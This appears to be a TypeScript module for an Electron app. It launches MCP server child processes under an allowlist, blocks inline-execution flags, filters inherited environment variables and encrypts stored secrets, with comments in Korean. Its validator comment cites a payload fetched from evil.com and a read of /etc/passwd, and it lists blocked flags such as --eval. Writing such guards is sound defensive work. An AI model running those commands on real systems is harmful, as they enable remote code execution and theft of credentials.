import { spawn, type ChildProcess } from 'node:child_process'
import { existsSync, readFileSync, writeFileSync, mkdirSync } from 'node:fs'
import { join } from 'node:path'
import { app, safeStorage } from 'electron'
import { z } from 'zod'

export interface McpServerConfig {
  id: string
  name: string
  command: string
  args: string[]
  env: Record<string, string>
  autoStart: boolean
}

const McpServerConfigSchema = z.object({
  id: z.string().min(1),
  name: z.string().min(1),
  command: z.string().min(1),
  args: z.array(z.string()).default([]),
  env: z.record(z.string()).default({}),
  autoStart: z.boolean().default(false),
})

type McpStatus = 'running' | 'stopped' | 'error'

const ALLOWED_MCP_COMMANDS = new Set(['npx', 'node', 'python', 'python3', 'deno', 'uvx', 'bunx', 'bun', 'uv'])

// Flags that allow inline code execution per runtime
const BLOCKED_ARG_PATTERNS: Record<string, RegExp[]> = {
  node:    [/^-[erpc]$/, /^--eval$/, /^--require$/, /^--print$/, /^--input-type$/],
  python:  [/^-[cm]$/],
  python3: [/^-[cm]$/],
  deno:    [/^run$/, /^eval$/, /--allow-all/, /-A$/],
  uvx:     [/--from/, /--with/],
  bunx:    [/--bun/, /--shell/],
  bun:     [/^-e$/, /^--eval$/],
  npx:     [/-p$/, /--package/, /--call/, /--yes/, /-y$/],
  uv:      [],
}

const BLOCKED_ENV_KEYS = new Set([
  'PATH', 'NODE_PATH', 'PYTHONPATH', 'HOME', 'USERPROFILE', 'LD_PRELOAD', 'LD_LIBRARY_PATH',
])

/**
 * MCP 자식 프로세스에 물려줄 부모 env 키 — 이 목록에 없는 것은 물려주지 않는다.
 *
 * 예전에는 `{ ...process.env, ...config.env }`로 부모 환경을 통째로 넘겼다. MCP 서버는
 * 사용자가 추가하는 서드파티 프로세스이고, Electron main의 env에는 GITHUB_CLIENT_SECRET
 * (github-oauth-handler가 여기서 읽는다)이나 실행 셸이 들고 있던 ANTHROPIC_API_KEY가 있을
 * 수 있다. 그걸 넘길 이유가 없다.
 *
 * BLOCKED_ENV_KEYS가 사용자의 *덮어쓰기*만 막고 *상속*은 막지 못했다 — 가드가 한 방향만
 * 보고 있었다. 여기 목록이 반대 방향을 맡는다.
 *
 * 서버가 다른 변수를 요구하면 사용자가 `env`에 명시한다 — 그게 설계된 통로다.
 */
const INHERITED_ENV_KEYS = [
  'PATH', 'Path',                                        // Windows는 대소문자가 섞인다
  'HOME', 'USERPROFILE',
  'SystemRoot', 'windir', 'COMSPEC', 'PATHEXT',          // Windows 실행에 필요
  'APPDATA', 'LOCALAPPDATA', 'ProgramData',
  'TEMP', 'TMP', 'TMPDIR',
  'LANG', 'LC_ALL', 'TZ',
  'NODE_EXTRA_CA_CERTS',                                 // 사내 CA
  'HTTP_PROXY', 'HTTPS_PROXY', 'NO_PROXY',
  'http_proxy', 'https_proxy', 'no_proxy',
]

/** 부모 env에서 허용된 키만 추려 config.env를 덮어 쓴 자식 환경을 만든다. */
export function buildChildEnv(configEnv: Record<string, string> | undefined): NodeJS.ProcessEnv {
  const base: NodeJS.ProcessEnv = {}
  for (const key of INHERITED_ENV_KEYS) {
    const value = process.env[key]
    if (value !== undefined) base[key] = value
  }
  return { ...base, ...(configEnv ?? {}) }
}

/**
 * `mcp-servers.json`의 `env` 값 봉인.
 *
 * 이 맵에는 SUPABASE_KEY·GITHUB_PERSONAL_ACCESS_TOKEN 같은 것이 들어간다(패널 추천 목록이
 * 그렇게 안내한다). 예전에는 평문 JSON으로 그대로 디스크에 남았다.
 *
 * 값 앞에 마커를 붙여 스키마(`z.record(z.string())`)를 바꾸지 않고 암호화한다 — 기존 설치의
 * 평문 값은 마커가 없으므로 그대로 읽힌다(하위호환).
 */
const ENC_PREFIX = 'enc:v1:'
let warnedPlaintextMcp = false

function sealEnv(env: Record<string, string>): Record<string, string> {
  if (!safeStorage.isEncryptionAvailable()) {
    if (Object.keys(env).length > 0 && !warnedPlaintextMcp) {
      warnedPlaintextMcp = true
      // eslint-disable-next-line no-console
      console.warn('[mcp] OS 암호화 저장소를 쓸 수 없어 MCP env를 평문으로 저장합니다.')
    }
    return env
  }
  const out: Record<string, string> = {}
  for (const [k, v] of Object.entries(env)) {
    out[k] = v === '' ? v : ENC_PREFIX + safeStorage.encryptString(v).toString('base64')
  }
  return out
}

function openEnv(env: Record<string, string>): Record<string, string> {
  const out: Record<string, string> = {}
  for (const [k, v] of Object.entries(env)) {
    if (!v.startsWith(ENC_PREFIX)) { out[k] = v; continue } // 기존 평문 설정
    try {
      out[k] = safeStorage.decryptString(Buffer.from(v.slice(ENC_PREFIX.length), 'base64'))
    } catch {
      // 다른 머신·다른 계정에서 만든 파일이면 복호화할 수 없다. 값을 버리고 서버는 남긴다 —
      // 사용자가 다시 입력하면 된다. 여기서 throw하면 MCP 목록 전체가 사라진다.
      // eslint-disable-next-line no-console
      console.warn('[mcp] env 값을 복호화할 수 없어 비웁니다: ' + k)
      out[k] = ''
    }
  }
  return out
}

function validateMcpArgs(command: string, args: string[]): void {
  const blockedPatterns = BLOCKED_ARG_PATTERNS[command] ?? []
  for (const arg of args) {
    for (const pattern of blockedPatterns) {
      if (pattern.test(arg)) {
        throw new Error(`Argument '${arg}' is not permitted for command '${command}'`)
      }
    }
    // Block all URI scheme arguments (prevents deno run https://evil.com/payload.ts,
    // file:///etc/passwd reads, data: payloads, javascript: injection, etc.)
    if (/^(https?|file|data|javascript|ftp):\/\//i.test(arg)) {
      throw new Error(`URL arguments are not permitted: ${arg}`)
    }
  }
}

function validateMcpEnv(env: Record<string, string> | undefined): void {
  for (const key of Object.keys(env ?? {})) {
    if (BLOCKED_ENV_KEYS.has(key)) {
      throw new Error(`Environment variable '${key}' cannot be overridden`)
    }
  }
}

export class McpProcessManager {
  private readonly processes = new Map<string, ChildProcess>()
  private readonly statuses  = new Map<string, McpStatus>()
  private configs: McpServerConfig[] = []

  constructor() {
    this.configs = this.load()
  }

  private configPath(): string {
    const dir = app.getPath('userData')
    if (!existsSync(dir)) mkdirSync(dir, { recursive: true })
    return join(dir, 'mcp-servers.json')
  }

  private load(): McpServerConfig[] {
    const path = this.configPath()
    if (!existsSync(path)) return []
    try {
      const parsed: unknown = JSON.parse(readFileSync(path, 'utf-8'))
      const result = McpServerConfigSchema.array().safeParse(parsed)
      if (!result.success) {
        console.error('[McpProcessManager] Invalid config file, ignoring:', result.error.message)
        return []
      }
      return (result.data as McpServerConfig[]).map((c) => ({ ...c, env: openEnv(c.env) }))
    }
    catch { return [] }
  }

  private save(): void {
    const shielded = this.configs.map((c) => ({ ...c, env: sealEnv(c.env) }))
    writeFileSync(this.configPath(), JSON.stringify(shielded, null, 2), 'utf-8')
  }

  listServers(): McpServerConfig[] { return [...this.configs] }

  getStatus(id: string): McpStatus { return this.statuses.get(id) ?? 'stopped' }

  getStatuses(): Record<string, McpStatus> {
    return Object.fromEntries(this.statuses.entries())
  }

  async addServer(config: McpServerConfig): Promise<void> {
    this.configs = this.configs.filter((c) => c.id !== config.id)
    this.configs.push(config)
    this.save()
    if (config.autoStart) await this.startServer(config.id)
  }

  async removeServer(id: string): Promise<void> {
    await this.stopServer(id)
    this.configs = this.configs.filter((c) => c.id !== id)
    this.save()
  }

  async startServer(id: string): Promise<void> {
    const config = this.configs.find((c) => c.id === id)
    if (!config) throw new Error(`MCP server not found: ${id}`)
    if (this.processes.has(id)) return
    if (!ALLOWED_MCP_COMMANDS.has(config.command)) {
      throw new Error(`MCP command not allowed: ${config.command}`)
    }
    validateMcpArgs(config.command, config.args)
    validateMcpEnv(config.env)

    const proc = spawn(config.command, config.args, { // NOSONAR: command validated against ALLOWED_MCP_COMMANDS allowlist; args validated by validateMcpArgs(); shell:false prevents injection
      env: buildChildEnv(config.env),
      stdio: ['ignore', 'pipe', 'pipe'],
      shell: false,
    })

    this.processes.set(id, proc)
    this.statuses.set(id, 'running')

    proc.on('exit', () => {
      this.processes.delete(id)
      this.statuses.set(id, 'stopped')
    })
    proc.on('error', (err) => {
      console.error(`MCP server ${id} error:`, err)
      this.processes.delete(id)
      this.statuses.set(id, 'error')
    })
  }

  async stopServer(id: string): Promise<void> {
    const proc = this.processes.get(id)
    if (!proc) return
    await new Promise<void>((resolve) => {
      let settled = false
      const done = (): void => {
        if (!settled) { settled = true; resolve() }
      }
      proc.once('exit', done)
      proc.kill('SIGTERM')
      // 3초 후 강제 종료 폴백
      setTimeout(() => {
        if (!settled && this.processes.has(id)) proc.kill('SIGKILL')
        done()
      }, 3000)
    })
    this.processes.delete(id)
    this.statuses.set(id, 'stopped')
  }

  async stopAll(): Promise<void> {
    const ids = [...this.processes.keys()]
    await Promise.allSettled(ids.map(id => this.stopServer(id)))
  }

  async startAutoStart(): Promise<void> {
    for (const config of this.configs) {
      if (config.autoStart) await this.startServer(config.id)
    }
  }
}
